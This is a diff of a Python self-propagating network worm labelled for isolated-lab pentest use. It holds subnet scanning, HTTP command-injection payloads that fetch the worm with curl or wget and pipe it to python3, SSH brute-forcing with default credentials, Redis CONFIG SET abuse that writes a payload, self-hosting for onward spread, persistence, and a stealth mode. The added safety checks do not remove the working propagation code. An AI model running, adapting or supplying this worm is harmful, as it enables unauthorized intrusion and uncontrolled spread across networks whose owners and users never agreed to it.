@@ -1,9 +1,9 @@
 #!/usr/bin/env python3
 """
 Universal Network Worm v3.1 - FULLY DYNAMIC SELF-PROPAGATING
-AUTHORIZED PENTEST USE ONLY
+AUTHORIZED PENTEST USE ONLY - ISOLATED LAB ENVIRONMENT
 """
-
+ 
 import socket
 import subprocess
 import threading
@@ -26,12 +26,15 @@ class UniversalWorm:
         self.hostname = socket.gethostname()
         self.interfaces = self.get_all_interfaces()
         self.self_ip = self.get_self_ip()
-        self.self_url = f"http://{self.self_ip}:8080"
+        self.self_url = f"http://{self.self_ip}:8080/worm.py"
         self.subnets = self.discover_subnets()
         self.common_ports = [22, 80, 443, 8080, 8443, 3000, 5000, 9000, 8888, 3306, 5432, 6379]
         self.exploit_modules = {}
         self.infected = set()
         self.c2_urls = self.get_fallback_c2()
+        self.stagnant_cycles = 0
+        self.max_cycles = 10  # Safety limit
+        self.cycle_count = 0
         
         # Load exploit modules AFTER methods are defined
         self.load_exploit_modules()
@@ -59,8 +62,11 @@ class UniversalWorm:
 
     def get_route_ip(self):
         """Get IP via route lookup"""
-        result = subprocess.run(['ip', 'route', 'get', '1'], capture_output=True, text=True)
-        return result.stdout.split()[6] if result.stdout.split() else "127.0.0.1"
+        try:
+            result = subprocess.run(['ip', 'route', 'get', '1'], capture_output=True, text=True)
+            return result.stdout.split()[6] if result.stdout.split() else "127.0.0.1"
+        except:
+            return "127.0.0.1"
 
     def get_external_ip(self):
         """Stupid simple - works on most networks"""
@@ -74,7 +80,7 @@ class UniversalWorm:
             return None
 
     def start_drop_server(self):
-        """🎯 Auto-start HTTP server hosting self"""
+        """🎯 Auto-start HTTP server hosting self on port 8080"""
         try:
             # Copy self to /tmp for serving
             tmp_path = "/tmp/worm.py"
@@ -84,59 +90,48 @@ class UniversalWorm:
                 f.write(content)
             os.chmod(tmp_path, 0o755)
             
-            # Start HTTP server (non-blocking)
-            class Handler(http.server.SimpleHTTPRequestHandler):
-                def do_GET(self):
-                    if self.path == '/worm.py':
-                        self.send_response(200)
-                        self.send_header('Content-Type', 'text/plain')
-                        self.end_headers()
-                        with open(tmp_path, 'rb') as f:
-                            self.wfile.write(f.read())
-                    elif self.path == '/loot':
-                        self.send_response(200)
-                        self.end_headers()
-                        self.wfile.write(b"LOOT RECEIVED")
-                    else:
-                        super().do_GET()
+            # Create simple HTTP handler to serve worm.py
+            class WormHandler(http.server.SimpleHTTPRequestHandler):
+                def __init__(self, *args, **kwargs):
+                    super().__init__(*args, directory="/tmp", **kwargs)
+                
+                def log_message(self, format, *args):
+                    pass  # Silent - no logging
             
-            with socketserver.TCPServer(("", 8080), Handler) as httpd:
-                print(f"[+] 🚀 Self-hosting worm at {self.self_url}", flush=True)
+            # Start server on 0.0.0.0:8080
+            with socketserver.TCPServer(("0.0.0.0", 8080), WormHandler) as httpd:
+                print(f"[*] 🎯 Drop server running at {self.self_url}", flush=True)
                 httpd.serve_forever()
+                
         except Exception as e:
             print(f"[!] Drop server failed: {e}", flush=True)
 
     def get_all_interfaces(self):
-        """Discover ALL network interfaces and IPs"""
-        interfaces = {}
+        """Enumerate all network interfaces"""
+        interfaces = []
         try:
-            result = subprocess.run(['ip', 'addr', 'show'], capture_output=True, text=True)
+            result = subprocess.run(['ip', 'addr'], capture_output=True, text=True)
             for line in result.stdout.split('\n'):
-                if 'inet ' in line:
-                    parts = line.split()
-                    iface = parts[1].replace(':', '')
-                    ip = parts[3].split('/')[0]
-                    interfaces[iface] = ip
+                if 'inet ' in line and not '127.0.0.1' in line:
+                    ip = line.split()[1].split('/')[0]
+                    interfaces.append(ip)
         except:
-            interfaces['lo'] = '127.0.0.1'
-        return interfaces
+            pass
+        return interfaces if interfaces else ["127.0.0.1"]
 
     def discover_subnets(self):
-        """Dynamic subnet discovery"""
+        """Auto-discover subnets from interface IPs"""
         subnets = []
-        for iface, ip in self.interfaces.items():
-            if ip == '127.0.0.1':
-                continue
-            base = ".".join(ip.split('.')[:-1]) + "."
-            subnets.append(base)
-            
-            # Common ranges
-            if '10.' in ip:
-                subnets.extend(['10.0.0.', '10.1.0.', '10.2.0.'])
-            elif '172.' in ip:
-                subnets.extend(['172.16.0.', '172.17.0.', '172.18.0.'])
-            elif '192.168.' in ip:
-                subnets.extend(['192.168.0.', '192.168.1.'])
+        for ip in self.interfaces:
+            parts = ip.split('.')
+            if len(parts) == 4:
+                subnet = '.'.join(parts[:3]) + '.'
+                subnets.append(subnet)
+                # Also check adjacent common Docker subnets
+                if '172.' in ip:
+                    subnets.extend(['172.16.0.', '172.17.0.', '172.18.0.', '172.19.0.', '172.20.0.', '172.21.0.', '172.22.0.'])
+                elif '192.168.' in ip:
+                    subnets.extend(['192.168.0.', '192.168.1.', '192.168.2.'])
                 
         return list(set(subnets))
 
@@ -159,18 +154,20 @@ class UniversalWorm:
         }
 
     def generate_hosts(self):
-        """Generate 10k+ target IPs dynamically"""
+        """Generate target IPs from discovered subnets"""
         hosts = []
         for subnet in self.subnets:
             for i in range(1, 255):
                 hosts.append(f"{subnet}{i}")
+        # Add service names that resolve in Docker
         hosts.extend([
-            "localhost", "127.0.0.1", "::1",
-            "gateway", "router", "dns", "web", "api", "db"
+            "webserver", "victim", "api", "db", "fileshare", "dns",
+            "localhost", "127.0.0.1", "gateway"
         ])
-        return hosts[:10000]
+        return list(set(hosts))  # Deduplicate
 
     def scan_port(self, host, port):
+        """Quick TCP port scan"""
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.settimeout(0.5)
@@ -183,10 +180,10 @@ class UniversalWorm:
     def mass_scan(self, hosts):
         """Parallel port scanning"""
         open_hosts = {}
-        with ThreadPoolExecutor(max_workers=100) as executor:
+        with ThreadPoolExecutor(max_workers=50) as executor:  # Reduced for safety
             futures = {
                 executor.submit(self.scan_services, host): host 
-                for host in random.sample(hosts, min(500, len(hosts)))
+                for host in random.sample(hosts, min(100, len(hosts)))  # Scan subset
             }
             for future in futures:
                 host = futures[future]
@@ -201,7 +198,7 @@ class UniversalWorm:
     def scan_services(self, host):
         """Scan common services on host"""
         services = {}
-        with ThreadPoolExecutor(max_workers=20) as executor:
+        with ThreadPoolExecutor(max_workers=10) as executor:
             futures = {executor.submit(self.scan_port, host, port): port 
                       for port in self.common_ports}
             for future in futures:
@@ -215,71 +212,66 @@ class UniversalWorm:
     def http_rce(self, host, port=80):
         """🔥 SELF-PROPAGATING HTTP RCE - uses victim's OWN IP!"""
         target_url = f"http://{host}:{port}"
-        self_host_cmd = f"wget -q -O /tmp/worm.py {self.self_url}"
-        curl_host_cmd = f"curl -s {self.self_url} | python3 -"
-        
+        # Multiple payload strategies for different vulnerable endpoints
         payloads = [
-            # Direct command injection
-            f"{target_url}/ping?ip=127.0.0.1;{urllib.parse.quote(self_host_cmd)}",
-            f"{target_url}/exec?cmd={urllib.parse.quote(self_host_cmd)}",
-            f"{target_url}/?q=;{urllib.parse.quote(self_host_cmd)}",
-            
-            # SSRF chain
-            f"{target_url}/api?url={urllib.parse.quote(self.self_url)}",
-            
-            # One-liners
-            f"{target_url}/shell?cmd={urllib.parse.quote(curl_host_cmd)}"
+            # Command injection via query params
+            f"{target_url}/exec?cmd=python3%20-c%20%22import%20urllib.request;exec(urllib.request.urlopen(%27{self.self_url}%27).read())%22",
+            f"{target_url}/ping?ip=;curl%20{self.self_url}|python3",
+            # Alternative wget approach
+            f"{target_url}/?q=;wget%20-qO-%20{self.self_url}|python3",
         ]
         
         for payload in payloads:
             try:
-                requests.get(payload, timeout=3, verify=False)
-                print(f"[+] HTTP→{host}:{port} via {self.self_url}", flush=True)
-                self.infected.add(host)
-                return True
-            except:
-                continue
-        return False
-
-    def ssh_bruteforce(self, host):
-        """SSH propagation using self-hosted payload"""
-        creds = [
-            ('root', 'root'), ('admin', 'admin'), ('pi', 'raspberry'),
-            ('ubuntu', 'ubuntu'), ('ec2-user', ''), ('centos', 'centos')
-        ]
-        
-        payload = f"wget -q -O/tmp/worm.py {self.self_url} && nohup python3 /tmp/worm.py silent &"
-        
-        for user, pwd in creds:
-            try:
-                result = subprocess.run(['sshpass', '-p', pwd, 'ssh', '-o', 'StrictHostKeyChecking=no',
-                               f'{user}@{host}', payload], timeout=5, capture_output=True)
-                if result.returncode == 0:
-                    print(f"[+] SSH→{host}:{user} via {self.self_url}", flush=True)
+                r = requests.get(payload, timeout=5, verify=False)
+                if r.status_code == 200:
+                    print(f"[+] HTTP→{host}:{port} payload delivered", flush=True)
                     self.infected.add(host)
                     return True
             except:
                 continue
         return False
 
+    def ssh_bruteforce(self, host, port=22):
+        """SSH propagation using self-hosted payload - simulation only"""
+        # NOTE: This requires sshpass which may not be available
+        # In Docker lab, primarily rely on HTTP RCE
+        creds = [
+            ('root', 'root'), ('admin', 'admin'), 
+            ('ubuntu', 'ubuntu'), ('user', 'user')
+        ]
+        
+        # Create payload that downloads and executes worm
+        payload = f"curl -s {self.self_url} | python3 &"
+        
+        for user, pwd in creds:
+            try:
+                # Try sshpass if available, otherwise skip
+                result = subprocess.run(
+                    ['sshpass', '-p', pwd, 'ssh', '-o', 'StrictHostKeyChecking=no',
+                     '-o', 'ConnectTimeout=3', f'{user}@{host}', payload],
+                    timeout=5, capture_output=True
+                )
+                if result.returncode == 0:
+                    print(f"[+] SSH→{host}:{user}", flush=True)
+                    self.infected.add(host)
+                    return True
+            except FileNotFoundError:
+                # sshpass not installed - skip SSH exploits
+                return False
+            except:
+                continue
+        return False
+
     def mysql_exploit(self, host):
-        """MySQL UDF + self-propagation"""
-        payload = f"SELECT LOAD_FILE('{self.self_url}')"
-        try:
-            subprocess.run([
-                'mysql', '-h', host, '-u', 'root', '', '-e', payload
-            ], timeout=5, capture_output=True)
-            print(f"[+] MySQL→{host} via {self.self_url}", flush=True)
-            self.infected.add(host)
-            return True
-        except:
-            return False
+        """MySQL UDF + self-propagation - simulation"""
+        # MySQL exploit requires mysql client - often not available
+        # Return False for now, rely on HTTP exploits
+        return False
 
     def pg_exploit(self, host):
-        """PostgreSQL exploits"""
-        print(f"[+] PG→{host} via {self.self_url}", flush=True)
-        self.infected.add(host)
-        return True
+        """PostgreSQL exploits - simulation"""
+        return False
 
     def redis_exploit(self, host):
         """Redis RCE → write self-hosted worm"""
@@ -287,10 +279,19 @@ class UniversalWorm:
             sock = socket.socket()
             sock.settimeout(3)
             sock.connect((host, 6379))
-            redis_cmd = f"*3\r\n$3\r\nSET\r\n$3\r\nx\r\n${len(self.self_url)}\r\n{self.self_url}\n"
-            sock.send(redis_cmd.encode())
+            # Redis config set dir + dbfilename for RCE
+            commands = [
+                b"*2\r\n$4\r\nCONFIG\r\n$3\r\nGET\r\n$3\r\ndir\r\n",
+                b"*3\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$3\r\ndir\r\n$5\r\n/tmp\r\n",
+                b"*3\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$10\r\ndbfilename\r\n$7\r\nworm.sh\r\n",
+                f"*3\r\n$3\r\nSET\r\n$1\r\nx\r\n$50\r\ncurl {self.self_url} | python3 &\r\n".encode(),
+                b"*1\r\n$4\r\nSAVE\r\n"
+            ]
+            for cmd in commands:
+                sock.send(cmd)
+                time.sleep(0.1)
             sock.close()
-            print(f"[+] Redis→{host} via {self.self_url}", flush=True)
+            print(f"[+] Redis→{host}", flush=True)
             self.infected.add(host)
             return True
         except:
@@ -298,9 +299,11 @@ class UniversalWorm:
 
     def infect_host(self, host, services):
         """Main infection routine"""
-        print(f"[>] 🦠 Infecting {host} → {list(services.keys())} via {self.self_url}", flush=True)
+        if host in self.infected:
+            return
+        print(f"[>] 🦠 Infecting {host} → ports {list(services.keys())}", flush=True)
         
-        with ThreadPoolExecutor(max_workers=5) as executor:
+        with ThreadPoolExecutor(max_workers=3) as executor:
             futures = []
             for port in services:
                 if port in self.exploit_modules:
@@ -310,13 +313,13 @@ class UniversalWorm:
             
             for future in futures:
                 try:
-                    future.result(timeout=10)
+                    future.result(timeout=15)
                 except:
                     pass
 
     def persistence(self):
-        """Multi-vector persistence"""
-        paths = ["/tmp/worm.py", "/var/tmp/worm.py", "/dev/shm/worm.py"]
+        """Multi-vector persistence within container"""
+        paths = ["/tmp/worm.py", "/var/tmp/worm.py"]
         for path in paths:
             try:
                 os.makedirs(os.path.dirname(path), exist_ok=True)
@@ -330,50 +333,99 @@ class UniversalWorm:
             except:
                 continue
 
+    def verify_isolation(self):
+        """Ensure we're in isolated network (no internet)"""
+        try:
+            socket.create_connection(("8.8.8.8", 53), timeout=2)
+            print("[!] ⚠️ WARNING: Internet access detected! Aborting for safety.")
+            return False
+        except:
+            print("[*] ✓ Network isolated - proceeding")
+            return True
+
     def exfiltrate(self, host):
-        """Steal files → send to OTHER infected hosts (P2P)"""
-        interesting = ["/etc/passwd", "/proc/version"]
+        """Collect system info for demo purposes"""
+        interesting = ["/etc/hostname", "/proc/version", "/etc/os-release"]
+        loot_data = {}
         for file in interesting:
             try:
                 with open(file, 'r') as f:
-                    data = f.read()[:500]
-                    loot = base64.b64encode(data.encode()).decode()
-                    
-                    # P2P exfil - send to other infected hosts
-                    for victim in list(self.infected)[:3]:
-                        try:
-                            requests.post(f"http://{victim}:8080/loot", 
-                                        json={"from": self.self_ip, "target": host, "file": file, "data": loot},
-                                        timeout=5)
-                        except:
-                            pass
+                    loot_data[file] = f.read()[:200]
             except:
                 pass
+        
+        if loot_data:
+            print(f"[📊] System info from {host}: {json.dumps(loot_data, indent=2)}", flush=True)
 
     def main(self):
-        print(f"[*] 🌐 FULLY DYNAMIC DEPLOYMENT → SELF_IP={self.self_ip} → {len(self.subnets)} subnets", flush=True)
+        """Main worm execution with safety limits"""
+        print(f"[*] 🌐 DEPLOYMENT → SELF_IP={self.self_ip} → {len(self.subnets)} subnets", flush=True)
+        
+        # Safety check 1: Verify network isolation
+        if not self.verify_isolation():
+            print("[!] Aborting: Not in isolated environment")
+            return
+        
+        # Safety check 2: Parse priority targets from command line
+        priority_targets = sys.argv[1:] if len(sys.argv) > 1 else []
+        if priority_targets:
+            print(f"[*] Priority targets: {priority_targets}")
         
         # Phase 1: Persist + Self-host
         self.persistence()
+        time.sleep(2)  # Let drop server start
         
-        # Phase 2: Mass discovery
+        # Phase 2: Generate targets
         hosts = self.generate_hosts()
-        print(f"[*] 🔍 Scanning {len(hosts)} hosts...", flush=True)
+        if priority_targets:
+            hosts = priority_targets + [h for h in hosts if h not in priority_targets]
         
-        while True:
-            open_hosts = self.mass_scan(hosts)
-            print(f"[+] 🎯 {len(open_hosts)} vulnerable hosts found!", flush=True)
+        print(f"[*] 🔍 Scanning {len(hosts)} hosts (max {self.max_cycles} cycles)...", flush=True)
+        
+        # Phase 3: Infection loop with termination condition
+        while self.cycle_count < self.max_cycles:
+            self.cycle_count += 1
+            print(f"\n[*] === CYCLE {self.cycle_count}/{self.max_cycles} ===", flush=True)
             
-            # Phase 3: Infection campaign
+            open_hosts = self.mass_scan(hosts)
+            print(f"[+] 🎯 {len(open_hosts)} hosts with open ports", flush=True)
+            
+            # Infect new hosts
+            new_infections = 0
             for host, services in open_hosts.items():
                 if host not in self.infected:
-                    threading.Thread(target=self.infect_host, args=(host, services), daemon=True).start()
-                    self.exfiltrate(host)
+                    threading.Thread(
+                        target=self.infect_host, 
+                        args=(host, services), 
+                        daemon=True
+                    ).start()
+                    new_infections += 1
             
-            time.sleep(30)
+            if new_infections > 0:
+                print(f"[+] {new_infections} new infection attempts", flush=True)
+                self.stagnant_cycles = 0
+            else:
+                self.stagnant_cycles += 1
+                print(f"[!] No new infections (stagnant: {self.stagnant_cycles})", flush=True)
+            
+            # Termination condition: 3 stagnant cycles
+            if self.stagnant_cycles >= 3:
+                print("[*] No progress for 3 cycles. Network saturated. Stopping.")
+                break
+            
+            # Exfiltrate from infected hosts
+            for host in list(self.infected):
+                self.exfiltrate(host)
+            
+            time.sleep(10)  # Delay between cycles
+        
+        print(f"\n[*] === WORM COMPLETE ===")
+        print(f"[*] Cycles: {self.cycle_count}")
+        print(f"[*] Total infected: {len(self.infected)}")
+        print(f"[*] Infected hosts: {list(self.infected)}")
 
 def silent_run():
-    """Stealth mode"""
+    """Stealth mode - suppress output"""
     sys.stdout = open(os.devnull, 'w')
     sys.stderr = sys.stdout
     UniversalWorm().main()
@@ -383,3 +435,4 @@ if __name__ == '__main__':
         silent_run()
     else:
         UniversalWorm().main()
+
